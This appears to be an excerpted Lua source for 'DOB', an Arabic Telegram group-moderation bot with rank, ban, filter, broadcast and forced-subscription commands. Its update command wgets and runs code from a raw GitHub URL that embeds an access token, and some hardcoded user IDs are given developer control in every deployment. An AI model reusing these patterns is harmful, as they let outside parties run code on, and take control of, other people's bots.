...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./DOB.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DB", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DOBTEAM/Files_DOB/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1272123174,1272123174,1272123174}   
...
if hash or SudoBot(msg) or DevDOBW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevDOBW(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDOBW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDOBW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDOBW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1272123174) then  
var = true  
elseif tonumber(user_id) == tonumber(1272123174) then
var = true 
...
elseif tonumber(user_id) == tonumber(228105712) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
var = "المطور الاساسي²"  
elseif tonumber(user_id) == tonumber(bot_id) then  
...
local UserName = (data.username_ or "dob_g")
local NameUser = "✭➢ عن طريق » ["..data.first_name_.."](T.me/"..UserName..")"
...
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- الصلاحيات  ⍖ \nٴ━━━━━━━━━━'..'\n- تغيير المعلومات ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر الاعضاء ↞ ❴ '..restrict..' ❵'..'\n- دعوة عبر الرابط ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين  ↞ ❴ '..promote..' ❵')   
end
end
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@GG1_R")  
...
send(chat,msg.id_," ✭➢ الملف  ليس لهاذا البوت ")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ✭➢  يتم  ...\n ✭➢  رفع الملف الان")
else
...
send(chat,msg.id_,"\n ✭➢ تم رفع الملف بنجاح وتفعيل الكروبات\n ✭➢ ورفع {المنشئين الاساسيين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n ✭➢ العضــو » '..Name..'\n ✭➢ قام بالتكرار وتم طرده '  
...
--------------------------------------------------------------------------------------------------------------
function SourceDOB(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,' ✭➢ لا يمكن استخدام البوت يجب الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ✭➢ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevDOBW(msg) then
local bl = ' ✭➢ اهلا  مطور البوت\n ✭➢ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ✭➢ تسـتطـيع‌‏ آلتحگم  بالبوت\n ✭➢ من خلاال الكيبورد خاص بك\n ✭➢ قناة سورس البوت [اضغط هنا](t.me/dob_g)'
local keyboard = {
...
SourceDOBr = '✭➢ مرحبا بك عزيزي\n ✭➢ انا اسمي  '..Namebot..'\n ✭➢ لحماية الكروبات من التفليش والسبام والتوجيه ...الخ…\n ✭➢ لتفعيلي اتبع الاخطوات…⍖\n ✭➢ اضفني الى مجموعتك وارفعني مشرف واكتب كلمه { تفعيل } \n[ ✭➢ [قناة سورس البوت](http://t.me/dob_g)'
end 
send(msg.chat_id_, msg.id_, SourceDOBr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not DevDOBW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
local Text = ' ✭➢ الملصق مرسل من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if DEVDOBW(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,DOB_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ✭' and DEVDOBW(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ✭➢ تم تفعيل التواصل ' 
else
Text = '\n ✭➢ التواصل مفعله من قبل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ✭' and DEVDOBW(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ✭➢ تم تعطيل التواصل' 
else
Text = '\n ✭➢ التواصل معطله من قبل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ✭' and DEVDOBW(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ✭➢ تم تفعيل البوت الخدمي ' 
else
Text = '\n ✭➢ البوت الخدمي مفعل من قبل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ✭' and DevDOBW(msg) then  
...
if text == 'ضع كليشه ستارت ✭' and DEVDOBW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ✭➢ ارسل لي الكليشه ')
return false
end
if text == 'حذف كليشه ستارت ✭' and DEVDOBW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ✭➢ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ✭' and DEVDOBW(msg) then 
...
if text == 'الاصدار ✭' and DEVDOB(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✭➢ اصدار سورس دوب \n ✭➢ الاصدار »{ 1.2v}')
end
...
if text == 'الاحصائيات ✭' and DEVDOBW(msg) then 
...
if text == 'المشتركين ✭' and DEVDOBW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ✭➢ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ✭' and DEVDOBW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ✭➢ الكروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text=="اذاعه خاص ✭" and msg.reply_to_message_id_ == 0 and DEVDOBW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✭➢ ارسل الان اذاعتك \n ✭➢ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ✭" and msg.reply_to_message_id_ == 0 and DEVDOBW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✭➢ ارسل الان اذاعتك \n ✭➢ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ✭" and msg.reply_to_message_id_ == 0 and DEVDOBW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✭➢ ارسل الان اذاعتك؟ \n ✭➢ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ✭" and msg.reply_to_message_id_ == 0  and DEVDOBW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✭➢ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ✭" and msg.reply_to_message_id_ == 0  and DEVDOBW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✭➢ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ✭' and DEVDOBW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✭" and DEVDOBW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الكروبات ✭" and DEVDOBW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'✭➢  عدد الكروبات الان » { '..#group..' }'..DOBK..''..DOB..'\n✭➢  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevDOBW(msg) then
...
usertext = '\n ✭➢ العضو » ['..result.title_..'](t.me/'..(username or 'dob_g')..')'
status  = '\n ✭➢ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevDOBW(msg) then
...
usertext = '\n ✭➢ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'dob_g')..')'
status  = '\n ✭➢ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DEVDOBW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevDOBW(msg) then
...
local DOB1_Msg = database:get(bot_id.."DOB1:Add:Filter:Rp2"..text..msg.chat_id_)   
if DOB1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✭➢ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'dob_g')..') \n ✭➢ '..DOB1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if DOB_Msg and not Special(msg) then  
local DOB_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if DOB_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✭➢ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ✭➢ ["..DOB_Msg.."] \n")
else
send(msg.chat_id_,0," ✭➢ العضو : {["..data.first_name_.."](T.ME/dob_g)}\n ✭➢ ["..DOB_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✭➢ عذرا » {["..data.first_name_.."](T.ME/dob_g)}\n ✭➢ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevDOBW(msg) then
...
sendText(msg.chat_id_,'\n ✭➢ عن طريق » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ✭➢ تم تفعيل الكروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevDOBW(msg) then
...
if text == 'تحديث السورس' and DevDOBW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
os.execute('rm -rf DOB.lua')
os.execute('wget https://raw.githubusercontent.com/alblymlk/DOB/main/DOB.lua?token=ATBN6MSE6FTARQZ5R7MMTETAJY6NG')
send(msg.chat_id_, msg.id_,' ✭➢ تم تحديث السورس \n ✭➢ لديك اخر اصدار لسورس دوب\n ✭➢ الاصدار » { 1.3v}')
dofile('DOB.lua')  
end

if text and text:match("^تغير الاشتراك$") and DevDOBW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ✭➢ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevDOBW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ✭➢ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ✭" and DevDOBW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ✭➢ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ✭$") and DevDOBW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ✭➢ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ✭" and DevDOBW(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ✭" and DevDOBW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ✭➢ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ✭" and DevDOBW(msg) then  
...
database:sadd(bot_id.."DOB:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."DOB:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_DOB = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_DOB then 
names_DOB = database:smembers(bot_id.."DOB:blocname"..msg.chat_id_) or ""
if names_DOB and names_DOB[1] then 
for i=1,#names_DOB do 
if name_DOB:match("(.*)("..names_DOB[i]..")(.*)") then 
...
database:set(bot_id.."DOB:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."DOB:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."DOB:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."DOB:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."DOB:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_DOBa_new(DOB1,DOB2)
if DOB2 and DOB2.first_name_ then 
if DOB2.first_name_:match("(.*)"..database:get(bot_id.."DOB:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."DOB:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local DOB_nnn = database:get(bot_id.."DOB:nump"..msg.chat_id_) or 5
local DOB_nnn2 = database:get(bot_id.."DOB:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(DOB_nnn2) == tonumber(DOB_nnn) or tonumber(DOB_nnn2) > tonumber(DOB_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."DOB:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✭➢ عزيزي >>["..DOB2.username_.."](https://t.me/"..(DOB2.username_ or "dob_g")..")\n✭➢ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DOB:teh"..msg.chat_id_).."} بجانب اسمك\n✭➢ عدد المحاولات المتبقيه {"..(tonumber(DOB_nnn) - tonumber(DOB_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_DOBa_new)
end
end
...
local DOBChengName = database:get(bot_id.."DOB:Cheng:Name"..data.id_)
if not data.first_name_ then 
if DOBChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DOBChengName..']')
database:del(bot_id.."DOB:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if DOBChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."DOB:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local DOBChengUserName = database:get(bot_id.."DOB:Cheng:UserName"..data.id_)
if not data.username_ then 
if DOBChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DOBChengUserName..']')
database:del(bot_id.."DOB:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if DOBChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."DOB:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local DOBChengPhoto = database:get(bot_id.."DOB:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if DOBChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."DOB:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if DOBChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."DOB:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
if text == 'رفع نسخه الاحتياطيه' and DevDOBW(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ✭➢ عن طريق » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'dob_g')..') \n ✭➢ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✭➢ عن طريق » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'dob_g')..') \n ✭➢ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevDOBW(msg) then    
dofile('DOB.lua')  
send(msg.chat_id_, msg.id_, ' ✭➢ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevDOBW(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ✭➢ تم مسح قائمه العام')
return false
end
if text == ("قائمه العام") and DevDOBW(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ✭➢ قائمة المحظورين عام \n|━━━━━━DB━━━━━━|\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevDOBW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevDOBW(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevDOBW(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevDOBW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevDOBW(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevDOBW(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevDOBW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevDOBW(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevDOBW(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevDOBW(msg) then
...
if text == 'الملفات' and DevDOBW(msg) then
t = ' ✭➢ ملفات السورس دوب ↓\n|━━━━━━DB━━━━━━| \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if Get_info then
local TextS = "\n ✭➢ اهلا بك في متجر ملفات دوب\n ✭➢ ملفات السورس ↓\n|━━━━━━DB━━━━━━|\n\n"
local TextE = "\n|━━━━━━DB━━━━━━|\n ✭➢ علامة تعني { ✓ } ملف مفعل\n ✭➢ علامة تعني { ✘ } ملف معطل\n ✭➢ قناة سورس دوب ↓\n".." ✭➢ [اضغط هنا لدخول](t.me/dob_g) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevDOBW(msg) then
...
send(msg.chat_id_, msg.id_," ✭➢ عذرا الملف لايدعم سورس دوب \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevDOBW(msg) then
...
if text == "مسح الملفات" and DevDOBW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ✭➢ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevDOBW(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevDOBW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "dob_g")
...
function Function_DOB(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DOB, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DOB, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ✭➢ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'dob_g')..')'
status  = '\n ✭➢ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ✭➢ العضو » '..userid..''
...
---------
if text == ("رفع كانسر") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local  statuss  = '\n ✭➢ تم رفع العضــو كانسر في الكروب \n ✭➢ تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if (text == ("تنزيل كانسر")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✭➢ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'dob_g')..')'
status  = '\n ✭➢ تم تنزيل العضــو كانسر من الكروب\n ✭➢ مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ✭➢ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."DOB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."DOB1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ✭➢ تم منع الكلمه مع التحذير")  
database:del(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."DOB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."DOB1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."DOB1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ✭➢ ارسل الكلمه الان")  
database:set(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."DOB1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."DOB1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."DOB1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."DOB1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."DOB1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."DOB1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ✭➢ قائمة المنع \n|━━━━━━DB━━━━━━|\n"
for k,v in pairs(list) do  
local DOB_Msg = database:get(bot_id.."DOB1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..DOB_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevDOBW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ✭➢ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevDOBW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ✭➢ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'dob_g')..')'..'\n ✭➢ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevDOBW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevDOBW(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'دوب').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'دوب')
local DOB_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..DOB_Msg[math.random(#DOB_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevDOBW(msg) then 
...
if text == ("مسح ردود المطور") and DevDOBW(msg) then 
...
if text == ("ردود المطور") and DevDOBW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ✭➢ قائمة ردود المطور \n|━━━━━━DB━━━━━━|\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevDOBW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد للكل' and DevDOBW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'دوب').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevDOBW(msg) then   
...
if text == 'تعطيل المغادره' and DevDOBW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✭➢ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DOB')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'dob_g')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
DOBdx(msg.chat_id_, msg.id_, ' ✭➢ ايدي المجموعة » ( '..msg.chat_id_..' )\n ✭➢ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ✭➢ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ✭➢ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
